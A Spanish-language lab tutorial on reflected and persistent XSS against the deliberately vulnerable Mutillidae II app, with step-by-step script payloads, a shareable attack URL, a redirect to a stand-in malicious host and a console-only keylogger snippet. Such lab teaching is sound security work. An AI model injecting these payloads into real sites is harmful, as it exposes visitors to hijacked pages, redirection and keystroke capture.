**Advertencia Legal y Ética**

Esta guía es únicamente con fines **educativos y éticos**. **Nunca intentes estos ataques en sistemas que no tengas permiso explícito para auditar.**
Todo debe hacerse en un entorno de laboratorio, como una máquina virtual con Mutillidae instalado.



Requisitos previos

Máquina virtual con **Kali Linux** o similar (para el atacante).
Máquina virtual con **Mutillidae II** funcionando (por ejemplo, en XAMPP o LAMP).
Navegador actualizado (Firefox/Chrome).
Red local o NAT para que las máquinas se comuniquen.
Nivel de seguridad de Mutillidae en "0" o "Low".



# XSS Reflected – Herramienta "DNS Lookup"

### Descripción

En un ataque **Reflected XSS**, el script malicioso se refleja directamente en la respuesta del servidor, generalmente desde un parámetro en la URL.

### Ruta en Mutillidae:

```
http://<IP_MUTILIDAE>/mutillidae/index.php?page=dns-lookup.php
```

---

### Paso a Paso

#### 1. Visita la página

Abre la página DNS Lookup en Mutillidae.

#### 2. Inserta el siguiente **script malicioso** en el campo de nombre de dominio:

```html
"><script>alert('Reflected XSS')</script>
```

#### 3. Presiona **Submit**.

### Resultado esperado:

Se ejecutará un `alert()` en el navegador mostrando el mensaje “Reflected XSS”.

---

### Prompt / Script útil para pruebas

```html
"><script>document.body.style.backgroundColor='red';</script>
```

Esto cambiará el color del fondo al rojo, demostrando que puedes modificar el DOM (más sutil que un alert).

---

### Enlace para compartir el ataque (simulación):

```url
http://<IP_MUTILIDAE>/mutillidae/index.php?page=dns-lookup.php&target="><script>alert('XSS')</script>
```

---

# 2. XSS Persistente – Herramienta "Add to Your Blog"

### Descripción

En un ataque **Persistent XSS**, el script se guarda en la base de datos y se ejecuta cada vez que un usuario accede al contenido comprometido (como un blog).

### Ruta en Mutillidae:

```
http://<IP_MUTILIDAE>/mutillidae/index.php?page=add-to-your-blog.php
```

---

### Paso a Paso

#### 1. Ve a la sección "Add to Your Blog".

#### 2. En los campos de entrada usa:

* **Title:**

  ```
  Entrada maliciosa
  ```

* **Comment:**

  ```html
  <script>alert('Persistent XSS');</script>
  ```

#### 3. Presiona **Sign Guestbook**.

#### 4. Ve a la página principal del blog:

```
http://<IP_MUTILIDAE>/mutillidae/index.php?page=view-someones-blog.php
```

---

### 🎯 Resultado esperado:

Cada vez que alguien vea esa entrada del blog, el navegador ejecutará el script (mostrando el `alert()`).

---

### Otros scripts persistentes útiles

* Redireccionar:

  ```html
  <script>window.location='http://malicious-site.com'</script>
  ```

* Keylogger simulado (solo muestra teclas por consola):

  ```html
  <script>
    document.onkeypress = function(e) {
      console.log("Tecla presionada: " + e.key);
    }
  </script>
  ```
